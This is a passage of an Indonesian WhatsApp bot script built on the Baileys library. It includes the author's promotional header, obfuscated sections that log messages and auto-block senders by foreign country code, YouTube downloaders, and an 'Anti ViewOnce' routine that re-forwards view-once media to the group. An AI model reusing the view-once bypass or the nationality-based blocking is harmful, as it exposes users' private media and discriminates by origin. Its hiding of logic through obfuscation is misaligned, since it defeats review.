/* BASE ORI CREATED By Zero YT7
Follow Me On All Sosial Media
❑ My Youtube : Zero YT7
❑ My Instagram : @Zero_YT7
❑ My Github : Zero-YT7

Link Sosial Media Me
❑ Youtube : https://youtube.com/ZeroYT7
❑ Instagram : https://instagram.com/Zero_YT7
❑ Github : https://github.com/Zero-YT7

Donate Me For Support
❑ https://sociabuzz.com/ZeroYT7/tribe
*/

/* JIKA INGIN ORDER KEBUTUHAN BOT
SILAHKAN CEK DI WEBSITE SHOP SAYA
❑ https://zeroyt7.biz.id

/* BASE SCRIPT INI BARU JADI DAN MASIH FRESH
❑ SIMPLE
❑ RAPI
❑ KEREN
JIKA INGIN BELI YG FULL NO ENC / FULL FITUR
BISA LNGSUNG HUBUNGI SAYA
NO WA : 085157740529
*/

//━━━━━━━━━━━━━━━[ USE A READ SETTING ]━━━━━━━━━━━━━━━━━//

require('../options/setting')
require('../options/mess')

//━━━━━━━━━━━━━━━[ USE A READ MODULE ]━━━━━━━━━━━━━━━━━//

var { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require("@adiwajshing/baileys")
var { exec, spawn, execSync } = require('child_process')
var { EmojiAPI } = require("emoji-api")
var { syntaxerror } = require("syntax-error")

//━━━━━━━━━━━━━━━[ USE A READ API ]━━━━━━━━━━━━━━━━━//

var axios = require('axios')
var chalk = require('chalk')
var cheerio = require('cheerio')
var cookie = require('cookie')
var crypto = require('crypto')
var emoji = new EmojiAPI()
var FileType = require('file-type')
var fetch = require('node-fetch')
var fs = require('fs')
var fsx = require('fs-extra')
var ffmpeg = require('fluent-ffmpeg')
var FormData = require('form-data')
var Jimp = require('jimp')
var moment = require('moment-timezone')
var ms = require("ms")
var PhoneNumber = require('awesome-phonenumber')
var process = require('process')
var speed = require('performance-now')
var util = require('util')
var yts = require('yt-search')
var ytdl = require('ytdl-core') 

//━━━━━━━━━━━━━━━[ USE A READ LIBRARY ]━━━━━━━━━━━━━━━━━//

var { clockString, tanggal, getTime, isUrl, sleep, runtime, fetchJson, makeid, packname, myyt, creator, p, packname, author, getBuffer, jsonformat, format, reSize, generateProfilePicture } = require('../library/myfunc')
var { color, bgcolor } = require('../library/color')

//━━━━━━━━━━━━━━━[ USE A READ SCRAPER ]━━━━━━━━━━━━━━━━━//

var textpro = require('../library/scraper/textpro')
var photooxy = require('../library/scraper/photooxy')
var { cerpen } = require('../library/scraper/cerpen')
var { styletext } = require('../library/scraper/styletext')
var { uptotelegra } = require('../library/scraper/upload')
var scp1 = require('../library/scraper/scp1') 

//━━━━━━━━━━━━━━━[ USE A READ DATABASE ]━━━━━━━━━━━━━━━━━//

var antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
var db_menfes = JSON.parse(fs.readFileSync('./database/menfess.json'))
var prem = JSON.parse(fs.readFileSync('./database/premium.json'))
global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

//━━━━━━━━━━━━━━━[ USE A READ IMAGE ]━━━━━━━━━━━━━━━━━//

var thumbnail = fs.readFileSync('./image/zeroyt7.jpg')

//━━━━━━━━━━━━━━━[ USE A READ MODULE EXPORTS ]━━━━━━━━━━━━━━━━━//

module.exports = zeroyt7 = async (zeroyt7, m, chatUpdate, store) => {
try {
var { type, quotedMsg, mentioned, now, fromMe } = m
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[Â°â€¢Ï€Ã·Ã—Â¶âˆ†Â£Â¢â‚¬Â¥Â®â„¢+âœ“_=|~!?@#$%^&.Â©^]/gi.test(body) ? body.match(/^[Â°â€¢Ï€Ã·Ã—Â¶âˆ†Â£Â¢â‚¬Â¥Â®â„¢+âœ“_=|~!?@#$%^&.Â©^]/gi)[0] : "" : prefa ?? global.prefix
var chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
var pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ''
var messagesC = pes.slice(0).trim()
var content = JSON.stringify(m.message)
var isCmd = body.startsWith(prefix)
var command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
var args = body.trim().split(/ +/).slice(1)
var pushname = m.pushName || "No Name"
var botNumber = await zeroyt7.decodeJid(zeroyt7.user.id)
var itsMezeroyt7 = [botNumber, ...global.ownerNumber].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
var itsMe = m.sender == botNumber ? true : false
var text = q = args.join(" ")
var quoted = m.quoted ? m.quoted : m
var mime = (quoted.msg || quoted).mimetype || ''
var jam = moment.tz('asia/jakarta').format('HH:mm:ss')
var dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
var ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
var wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
var wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
var wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
var isMedia = /image|video|sticker|audio/.test(mime)
var isImage = (type == 'imageMessage')
var isVideo = (type == 'videoMessage')
var isAudio = (type == 'audioMessage')
var isSticker = (type == 'stickerMessage')
var isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
var isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
var isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
var isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
var isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
var isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
var isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
var sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
var senderNumber = sender.split('@')[0]
var isAntilink = m.isGroup ? antilink.includes(from) : false
var groupMetadata = m.isGroup ? await zeroyt7.groupMetadata(from).catch(e => {}) : ''
var groupName = m.isGroup ? groupMetadata.subject : ''
var participants = m.isGroup ? await groupMetadata.participants : ''
var groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
var groupOwner = m.isGroup ? groupMetadata.owner : ''
var groupMembers = m.isGroup ? groupMetadata.participants : ''
var isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
var isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
var isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
var mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
var mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
var mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
var numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
var usernya = mentionByReply ? mentionByReply : mentionByTag[0]
var Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
var isPrem = prem.includes(m.sender)

//━━━━━━━━━━━━━━━[ USE A READ PUBLIC ]━━━━━━━━━━━━━━━━━//

if (!zeroyt7.public) {
if (!m.key.fromMe) return
}

//━━━━━━━━━━━━━━━[ USE A READ COLOR ]━━━━━━━━━━━━━━━━━//

var listcolor = ['red','green','yellow','blue','magenta','cyan','white']
var randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

//━━━━━━━━━━━━━━━[ USE A READ CONSOLE MESSAGE ]━━━━━━━━━━━━━━━━━//

var _0x2fd06b=_0x505e;(function(_0x13672d,_0x68ac1c){var _0x4c3757=_0x505e,_0x3c1366=_0x13672d();while(!![]){try{var _0x3f53a3=parseInt(_0x4c3757(0xae))/(-0x212a+0xeaa+-0x3*-0x62b)+parseInt(_0x4c3757(0xb0))/(-0xc63+-0x103f+0x34*0x8d)*(-parseInt(_0x4c3757(0xbf))/(0x1*0x3ad+-0x1905+-0x4d*-0x47))+parseInt(_0x4c3757(0xc0))/(-0x85f+-0x16b4+0x1f17)*(-parseInt(_0x4c3757(0xbd))/(-0x270d*-0x1+0x1930+-0x807*0x8))+-parseInt(_0x4c3757(0xb9))/(-0x1931*0x1+-0x8*0x362+-0x9*-0x5cf)+parseInt(_0x4c3757(0xb6))/(-0x7ba+0x16c9+-0xf08)*(-parseInt(_0x4c3757(0xc2))/(0x2*-0x6bb+-0xa1+0x5*0x2d3))+parseInt(_0x4c3757(0xbe))/(0xd23+0x25*0xda+-0x2c9c)+parseInt(_0x4c3757(0xb4))/(0x1674*-0x1+-0x11*-0x7+-0x1*-0x1607);if(_0x3f53a3===_0x68ac1c)break;else _0x3c1366['push'](_0x3c1366['shift']());}catch(_0xca9fa4){_0x3c1366['push'](_0x3c1366['shift']());}}}(_0x1d20,-0x3df24*0x2+0x573f4+0x667a9));isCmd&&console[_0x2fd06b(0xb1)](chalk[_0x2fd06b(0xba)][_0x2fd06b(0xb2)][_0x2fd06b(0xaf)](_0x2fd06b(0xb3)),color(_0x2fd06b(0xbb),''+randomcolor),color(_0x2fd06b(0xb7),''+randomcolor),color(''+pushname,''+randomcolor),color(_0x2fd06b(0xb8),''+randomcolor),color(''+body,''+randomcolor));function _0x505e(_0x36bcf3,_0x4684f2){var _0x532042=_0x1d20();return _0x505e=function(_0x3e5b25,_0x2cf8b8){_0x3e5b25=_0x3e5b25-(0x1b22+-0x1*0x19cb+-0xa9);var _0x11fc20=_0x532042[_0x3e5b25];return _0x11fc20;},_0x505e(_0x36bcf3,_0x4684f2);}function _0x1d20(){var _0x3ee3e3=['log','bgCyan','Zero\x20YT7','2387690sonicZ','unavailabl','2093bxKtYb','FROM','Text\x20:','1773906SZTSFu','yellow','[\x20PESAN\x20]','sendPresen','5SXuiuJ','4225707XQCkKY','588753lhoVFy','121868tTFggI','ceUpdate','5088anEQCw','273894sMyCXS','bold','2UpJbRY'];_0x1d20=function(){return _0x3ee3e3;};return _0x1d20();}zeroyt7[_0x2fd06b(0xbc)+_0x2fd06b(0xc1)](_0x2fd06b(0xb5)+'e',from);

//━━━━━━━━━━━━━━━[ USE A READ AUTO BLOCK NO LUAR NEGRI ]━━━━━━━━━━━━━━━━━//

var _0x461458=_0x4a53;(function(_0x3d40dd,_0x1e55d9){var _0x5151e=_0x4a53,_0x103ecf=_0x3d40dd();while(!![]){try{var _0x726783=-parseInt(_0x5151e(0x157))/(-0x20c6*0x1+0x5*-0x683+-0x1*-0x4156)+parseInt(_0x5151e(0x15a))/(0x11*-0x119+-0xd3*0x19+0x2*0x13a3)+-parseInt(_0x5151e(0x156))/(0x527+0x95*0x16+-0x8f9*0x2)+-parseInt(_0x5151e(0x15d))/(0x10b4+0x27c+-0x132c)+parseInt(_0x5151e(0x15c))/(0x1*0x1867+-0x1f66+0x704)*(parseInt(_0x5151e(0x15b))/(-0x7c7*0x3+-0x525+0x1c80))+parseInt(_0x5151e(0x15f))/(-0x15*0xb7+-0x103e+0x1f48)*(parseInt(_0x5151e(0x158))/(-0x29*-0x9d+-0x1fa8+-0x5*-0x14f))+parseInt(_0x5151e(0x15e))/(-0x2*-0xc97+-0x4bb+0x367*-0x6);if(_0x726783===_0x1e55d9)break;else _0x103ecf['push'](_0x103ecf['shift']());}catch(_0x3079be){_0x103ecf['push'](_0x103ecf['shift']());}}}(_0x4858,-0x2*-0x31723+-0xe482d*-0x1+-0xb94e8));function _0x4a53(_0x3c54b9,_0x4505e4){var _0x470af5=_0x4858();return _0x4a53=function(_0xa22690,_0x2c2ab5){_0xa22690=_0xa22690-(0x9a3*0x3+-0x1d73+0x1dc);var _0x5992d3=_0x470af5[_0xa22690];return _0x5992d3;},_0x4a53(_0x3c54b9,_0x4505e4);}if(sender[_0x461458(0x153)](_0x461458(0x155)))return zeroyt7[_0x461458(0x152)+_0x461458(0x159)](sender,_0x461458(0x154));if(sender[_0x461458(0x153)]('91'))return zeroyt7[_0x461458(0x152)+_0x461458(0x159)](sender,_0x461458(0x154));function _0x4858(){var _0xf514f7=['updateBloc','startsWith','block','212','1344417sZCxuw','1137942XYNuRD','568YGAhLG','kStatus','651512xOClkO','42FHAqvb','609760ULZrJi','3736288MMyKYi','9754416uzcVta','82712DtZTfi'];_0x4858=function(){return _0xf514f7;};return _0x4858();}if(sender[_0x461458(0x153)]('92'))return zeroyt7[_0x461458(0x152)+_0x461458(0x159)](sender,_0x461458(0x154));if(sender[_0x461458(0x153)]('90'))return zeroyt7[_0x461458(0x152)+_0x461458(0x159)](sender,_0x461458(0x154));if(sender[_0x461458(0x153)]('54'))return zeroyt7[_0x461458(0x152)+_0x461458(0x159)](sender,_0x461458(0x154));if(sender[_0x461458(0x153)]('55'))return zeroyt7[_0x461458(0x152)+_0x461458(0x159)](sender,_0x461458(0x154));if(sender[_0x461458(0x153)]('40'))return zeroyt7[_0x461458(0x152)+_0x461458(0x159)](sender,_0x461458(0x154));if(sender[_0x461458(0x153)]('94'))return zeroyt7[_0x461458(0x152)+_0x461458(0x159)](sender,_0x461458(0x154));if(sender[_0x461458(0x153)]('60'))return zeroyt7[_0x461458(0x152)+_0x461458(0x159)](sender,_0x461458(0x154));

//━━━━━━━━━━━━━━━[ USE A READ SEND MESSAGE ]━━━━━━━━━━━━━━━━━//

async function sendzeroyt7Message(chatId, message, options = {}){
let generate = await generateWAMessage(chatId, message, options)
let type2 = getContentType(generate.message)
if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
return await zeroyt7.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

var sendSticker = (pesan) => {
zeroyt7.sendImageAsSticker(from, pesan, m, { packname: packname, author: global.author })
}

//━━━━━━━━━━━━━━━[ USE A READ PROFILE USER ]━━━━━━━━━━━━━━━━━//

try {
ppuser = await zeroyt7.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await reSize(ppuser, 300, 300)

//━━━━━━━━━━━━━━━[ USE A READ ANTILINK ]━━━━━━━━━━━━━━━━━//

if (m.isGroup && m.mtype == 'viewOnceMessage') {
let teks = `╭「 *Anti ViewOnce* 」\n├ *Name* : ${pushname}\n├ *User* : @${m.sender.split("@")[0]}\n├ *Clock* : ${wib} WIB\n└ *Message* : ${m.mtype}`
zeroyt7.sendMessage(from, { text: teks, mentions: [m.sender] }, { quoted: m })
await sleep(500)
m.copyNForward(from, true, {readViewOnce: true}, {quoted: m}).catch(_ => reply('Mungkin Dah Pernah Dibuka Bot'))
}

if (isAntilink) {
if (!isBotAdmins) return
if (budy.includes(`https://chat.whatsapp.com/`)) {
bvl = `*GROUP LINK DETECTOR*\n\nAdmin Telah Mengirim Link, Admin Tidak Akan Dikick`
if (isAdmins) m.reply(bvl)
if (m.key.fromMe) m.reply(bvl)
if (itsMezeroyt7) m.reply(bvl)
kice = m.sender
zeroyt7.sendMessage(from, {text:`*GROUP LINK DETECTOR*\n\n@${kice.split("@")[0]} Akan Dikick Karena Mengirim Link Di Group Ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
setTimeout( () => {
zeroyt7.groupParticipantsUpdate(from, [kice], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}, 3000)
} else {
}
}

//━━━━━━━━━━━━━━━[ USE A READ REPLY ]━━━━━━━━━━━━━━━━━//

var reply = (teks) => {
zeroyt7.sendMessage(from, { text: teks ,
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}
}, { quoted : m })
}

var ftroli = {
key: {
fromMe: false,
"participant":"0@s.whatsapp.net", 
"remoteJid": "status@broadcast"},
"message": {
orderMessage: {
itemCount: 2022,status: 200, 
thumbnail: (thumbnail), 
surface: 200, 
message: creator, 
orderTitle: creator, 
sellerJid: '6285157740529@s.whatsapp.net'}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded":true},
sendEphemeral: true}

//━━━━━━━━━━━━━━━[ USE A READ AUTO READ MESSAGE ]━━━━━━━━━━━━━━━━━//

let rn = ['recording','composing']
let jd = rn[Math.floor(Math.random() * rn.length)];

if (command) {
zeroyt7.sendPresenceUpdate(jd, from)
zeroyt7.readMessages([m.key])
}

//━━━━━━━━━━━━━━━[ USE A READ USER ]━━━━━━━━━━━━━━━━━//

var cekPesan = (satu, dua) => { 
let x2 = false
Object.keys(db_menfes).forEach((i) => {
if (db_menfes[i].id == dua){x2 = i}})
if (x2 !== false) {
if (satu == "id"){ return db_menfes[x2].id }
if (satu == "teman"){ return db_menfes[x2].teman }
}
if (x2 == false) { return null } 
}

//━━━━━━━━━━━━━━━[ USE A READ SPEED ]━━━━━━━━━━━━━━━━━//

var timestamp = speed()
var latensi = speed() - timestamp

//━━━━━━━━━━━━━━━[ USE A READ RANDOM ]━━━━━━━━━━━━━━━━━//

function getRandom(ext) {
ext = ext || ""
return `${Math.floor(Math.random() * 100000)}.${ext}`
}

//━━━━━━━━━━━━━━━[ USE A READ DOWNLOADER ]━━━━━━━━━━━━━━━━━//

(function(_0x54177f,_0x487d22){const _0x5e253a=_0x9e26,_0x1ff134=_0x54177f();while(!![]){try{const _0x5aa9a7=parseInt(_0x5e253a(0x9f))/(-0x1f*0xa7+0x2*-0x1216+0x3866)+parseInt(_0x5e253a(0x88))/(-0x11ad+0x1cfb+-0x5a6*0x2)*(parseInt(_0x5e253a(0xc2))/(0x10f3+0x2328+-0x3418))+-parseInt(_0x5e253a(0xa6))/(0x1eb0+-0xd8d+-0x111f)+-parseInt(_0x5e253a(0x85))/(0x358+-0x131a+0xfc7)+-parseInt(_0x5e253a(0xaf))/(0x5c*0x43+-0x10*-0x239+0x1dcf*-0x2)+-parseInt(_0x5e253a(0xd9))/(0xc7*-0xd+0x12d*0x16+-0xfbc)+parseInt(_0x5e253a(0x86))/(0xdb8+0x3*-0x161+0x3*-0x32f);if(_0x5aa9a7===_0x487d22)break;else _0x1ff134['push'](_0x1ff134['shift']());}catch(_0x1954ef){_0x1ff134['push'](_0x1ff134['shift']());}}}(_0x34e2,0x29*-0x4d2a+0x31b9*0x5+-0x233*-0x99f));function _0x34e2(){const _0x40faab=['\x0a🈂️\x20Durasi\x20','Download\x20A','meta','.mp3','shortDescr','eStream','jzOpB','channelId','ZditW','3465679FDDAUc','Bot\x20By\x20@','annel/','ideo\x20With\x20','5318020nvcNvo','24571936HTaNBz','RUvAH','1942VeIWuU','anUmU','kRsAZ','Dvinw','sendMessag','title','getInfo','\x0a📄\x20Deskrip','Download\x20V','LOCATION','donasi','audioonly','log','hannel\x20:\x20','bfMUQ','createWrit','𝐀𝐃\x20𝐌𝐏𝟑\x20▬▭▬','fWcQL','DSGxZ','hcRot','Wegsk','savefrom','𝐀𝐃\x20𝐌𝐏𝟒\x20▬▭▬','253542bvxyRQ','player_res','audio/mp4','tps://yout','👥Owner','iKmWk','XnVOu','2189696glgJMu','\x0a\x0a👤\x20Nama\x20C','ytdl-core','si\x20:\x20','UUOsm','author','ube.com/ch','../library','LECzd','5178072TlZRfH','CUUCh','udio\x20With\x20','.mp4','avefrom','iption','split','CfnIB','\x0a💌\x20Title\x20:','duration','💰Donasi','readFileSy','icWSo','NyVoe','HiXds','thumb','\x0a🔗\x20Link\x20Ch','ponse','dLNJn','879iocHMH','▬▭▬\x20𝐃𝐎𝐖𝐍𝐋𝐎','mnDBF','/scraper/s','annel\x20:\x20ht','succes','pipe','owner','finish','cMsVN','videoDetai','fYduy','unlinkSync','TqElI'];_0x34e2=function(){return _0x40faab;};return _0x34e2();}function _0x9e26(_0x113931,_0x188c12){const _0x5e4300=_0x34e2();return _0x9e26=function(_0x4297e0,_0x31fc4b){_0x4297e0=_0x4297e0-(-0x56*0x2+-0x20e5+-0x6d1*-0x5);let _0x113443=_0x5e4300[_0x4297e0];return _0x113443;},_0x9e26(_0x113931,_0x188c12);}var downloadMp4=async _0xb51cb6=>{const _0x3162ce=_0x9e26,_0x424519={'icWSo':function(_0x497a1c,_0x1da803){return _0x497a1c(_0x1da803);},'RUvAH':_0x3162ce(0xad)+_0x3162ce(0xc5)+_0x3162ce(0xb3),'CfnIB':function(_0x3362f5,_0x176130,_0xfd5ced,_0x57b4ec){return _0x3362f5(_0x176130,_0xfd5ced,_0x57b4ec);},'HiXds':_0x3162ce(0xa3),'CUUCh':_0x3162ce(0xb9),'Wegsk':_0x3162ce(0x91),'LECzd':_0x3162ce(0xb2),'hcRot':_0x3162ce(0x90)+_0x3162ce(0x84)+_0x3162ce(0xa8),'mnDBF':function(_0x593558,_0x5d3652){return _0x593558(_0x5d3652);},'DSGxZ':_0x3162ce(0xca),'jzOpB':function(_0x5afbfe,_0x17508b){return _0x5afbfe(_0x17508b);}};let _0x1a7d75=_0x424519[_0x3162ce(0xbb)](require,_0x424519[_0x3162ce(0x87)]),_0x501450=await _0x1a7d75[_0x3162ce(0x9d)](_0xb51cb6),_0x34cca3=await _0x424519[_0x3162ce(0xb6)](reSize,_0x501450[_0x3162ce(0xbe)],-0xd*-0x213+0x1fdf+-0x39aa,0xc10+0x1664+-0x2148),_0x23caa6=await ytdl[_0x3162ce(0x8e)](_0xb51cb6);const _0x226aec=[{'buttonId':prefix+_0x3162ce(0xc9),'buttonText':{'displayText':_0x424519[_0x3162ce(0xbd)]},'type':0x1},{'buttonId':prefix+_0x3162ce(0x92),'buttonText':{'displayText':_0x424519[_0x3162ce(0xb0)]},'type':0x1}],_0x5121e8={'location':{'jpegThumbnail':_0x34cca3},'caption':_0x3162ce(0xc3)+_0x3162ce(0x9e)+_0x3162ce(0xa7)+_0x3162ce(0x95)+_0x23caa6[_0x3162ce(0xa0)+_0x3162ce(0xc0)][_0x3162ce(0xcc)+'ls'][_0x3162ce(0xab)]+(_0x3162ce(0xbf)+_0x3162ce(0xc6)+_0x3162ce(0xa2)+_0x3162ce(0xac)+_0x3162ce(0xdb))+_0x23caa6[_0x3162ce(0xa0)+_0x3162ce(0xc0)][_0x3162ce(0xcc)+'ls'][_0x3162ce(0xd7)]+(_0x3162ce(0xb7)+'\x20')+_0x501450[_0x3162ce(0xd2)][_0x3162ce(0x8d)]+(_0x3162ce(0xd0)+':\x20')+_0x501450[_0x3162ce(0xd2)][_0x3162ce(0xb8)]+(_0x3162ce(0x8f)+_0x3162ce(0xa9))+_0x23caa6[_0x3162ce(0xa0)+_0x3162ce(0xc0)][_0x3162ce(0xcc)+'ls'][_0x3162ce(0xd4)+_0x3162ce(0xb4)],'mentions':[creator],'footer':creator,'buttons':_0x226aec,'headerType':_0x424519[_0x3162ce(0x9c)]};let _0x408032=await zeroyt7[_0x3162ce(0x8c)+'e'](from,_0x5121e8,{'quoted':ftroli});try{await ytdl[_0x3162ce(0x8e)](_0xb51cb6);let _0x4e468b=_0x424519[_0x3162ce(0xbb)](getRandom,_0x424519[_0x3162ce(0xae)]);console[_0x3162ce(0x94)](_0x424519[_0x3162ce(0xbb)](color,_0x424519[_0x3162ce(0x9b)]));let _0x9ce04e=_0x424519[_0x3162ce(0xc4)](ytdl,_0xb51cb6)[_0x3162ce(0xc8)](fs[_0x3162ce(0x97)+_0x3162ce(0xd5)](_0x4e468b))['on'](_0x424519[_0x3162ce(0x9a)],async()=>{const _0x297efc=_0x3162ce;await zeroyt7[_0x297efc(0x8c)+'e'](from,{'video':fs[_0x297efc(0xba)+'nc'](_0x4e468b),'caption':mess[_0x297efc(0xc7)],'gifPlayback':![]},{'quoted':_0x408032}),fs[_0x297efc(0xce)]('./'+_0x4e468b);});}catch(_0x3e9700){_0x424519[_0x3162ce(0xd6)](reply,''+_0x3e9700);}},downloadMp3=async _0x4a4028=>{const _0x18d311=_0x9e26,_0x50c5e1={'anUmU':_0x18d311(0xa1),'TqElI':function(_0x498760,_0x8f3216){return _0x498760(_0x8f3216);},'fWcQL':_0x18d311(0xad)+_0x18d311(0xc5)+_0x18d311(0xb3),'NyVoe':function(_0x200e89,_0x13de40,_0x1267a4,_0x414d00){return _0x200e89(_0x13de40,_0x1267a4,_0x414d00);},'ZditW':_0x18d311(0xa3),'kRsAZ':_0x18d311(0xb9),'XnVOu':_0x18d311(0x91),'dLNJn':function(_0x47f5b3,_0x1ce80e){return _0x47f5b3(_0x1ce80e);},'bfMUQ':_0x18d311(0xd3),'cMsVN':function(_0x5724f9,_0x4c43b9){return _0x5724f9(_0x4c43b9);},'Dvinw':_0x18d311(0xd1)+_0x18d311(0xb1)+_0x18d311(0xa8),'UUOsm':function(_0x46d106,_0x5d58b8,_0x2fca3d){return _0x46d106(_0x5d58b8,_0x2fca3d);},'fYduy':_0x18d311(0x93),'iKmWk':_0x18d311(0xca)};let _0x1220de=_0x50c5e1[_0x18d311(0xcf)](require,_0x50c5e1[_0x18d311(0x99)]),_0x4854e6=await _0x1220de[_0x18d311(0x9d)](_0x4a4028),_0x2d1582=await _0x50c5e1[_0x18d311(0xbc)](reSize,_0x4854e6[_0x18d311(0xbe)],-0x4f2+0x1d65+-0x1747,0x4*-0x517+-0x40*-0x18+-0x11c*-0xe),_0x15127e=await ytdl[_0x18d311(0x8e)](_0x4a4028);const _0x5211c1=[{'buttonId':prefix+_0x18d311(0xc9),'buttonText':{'displayText':_0x50c5e1[_0x18d311(0xd8)]},'type':0x1},{'buttonId':prefix+_0x18d311(0x92),'buttonText':{'displayText':_0x50c5e1[_0x18d311(0x8a)]},'type':0x1}],_0x20a300={'location':{'jpegThumbnail':_0x2d1582},'caption':_0x18d311(0xc3)+_0x18d311(0x98)+_0x18d311(0xa7)+_0x18d311(0x95)+_0x15127e[_0x18d311(0xa0)+_0x18d311(0xc0)][_0x18d311(0xcc)+'ls'][_0x18d311(0xab)]+(_0x18d311(0xbf)+_0x18d311(0xc6)+_0x18d311(0xa2)+_0x18d311(0xac)+_0x18d311(0xdb))+_0x15127e[_0x18d311(0xa0)+_0x18d311(0xc0)][_0x18d311(0xcc)+'ls'][_0x18d311(0xd7)]+(_0x18d311(0xb7)+'\x20')+_0x4854e6[_0x18d311(0xd2)][_0x18d311(0x8d)]+(_0x18d311(0xd0)+':\x20')+_0x4854e6[_0x18d311(0xd2)][_0x18d311(0xb8)]+(_0x18d311(0x8f)+_0x18d311(0xa9))+_0x15127e[_0x18d311(0xa0)+_0x18d311(0xc0)][_0x18d311(0xcc)+'ls'][_0x18d311(0xd4)+_0x18d311(0xb4)],'mentions':[creator],'footer':_0x18d311(0xda)+creator[_0x18d311(0xb5)]('@')[-0x23f4+-0xaa2*0x2+0x4*0xe4e],'buttons':_0x5211c1,'headerType':_0x50c5e1[_0x18d311(0xa5)]};let _0x39fa8d=await zeroyt7[_0x18d311(0x8c)+'e'](from,_0x20a300,{'quoted':ftroli});try{await ytdl[_0x18d311(0x8e)](_0x4a4028);let _0x329406=_0x50c5e1[_0x18d311(0xc1)](getRandom,_0x50c5e1[_0x18d311(0x96)]);console[_0x18d311(0x94)](_0x50c5e1[_0x18d311(0xcb)](color,_0x50c5e1[_0x18d311(0x8b)])),_0x50c5e1[_0x18d311(0xaa)](ytdl,_0x4a4028,{'filter':_0x50c5e1[_0x18d311(0xcd)]})[_0x18d311(0xc8)](fs[_0x18d311(0x97)+_0x18d311(0xd5)](_0x329406))['on'](_0x50c5e1[_0x18d311(0xa4)],async()=>{const _0x1f4fd1=_0x18d311;await zeroyt7[_0x1f4fd1(0x8c)+'e'](from,{'audio':fs[_0x1f4fd1(0xba)+'nc'](_0x329406),'mimetype':_0x50c5e1[_0x1f4fd1(0x89)]},{'quoted':_0x39fa8d}),fs[_0x1f4fd1(0xce)](_0x329406);});}catch(_0x45e906){_0x50c5e1[_0x18d311(0xc1)](reply,''+_0x45e906);}};

